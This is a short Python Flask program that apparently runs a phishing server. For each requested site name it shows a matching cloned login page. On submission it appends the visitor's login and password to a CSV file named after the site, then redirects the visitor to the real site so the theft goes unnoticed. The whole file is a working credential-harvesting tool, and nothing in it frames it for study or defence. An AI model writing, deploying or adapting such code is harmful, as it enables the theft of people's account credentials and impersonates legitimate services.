import sqlite3

from flask import Flask, render_template, request, redirect


app = Flask(__name__)


@app.route('/<site>', methods=['GET', 'POST'])
def index(site):
	if request.method == 'POST':
		
		login, password = request.values['login'], request.values['password']
		with open(f'{site}.csv', 'a') as file:
			print(f'{login},{password}', file=file)

		return redirect(f'https://{site}')

	return render_template(site.split('.')[0] + '.html', site=site)


if __name__ == '__main__':
	app.run(debug=True)
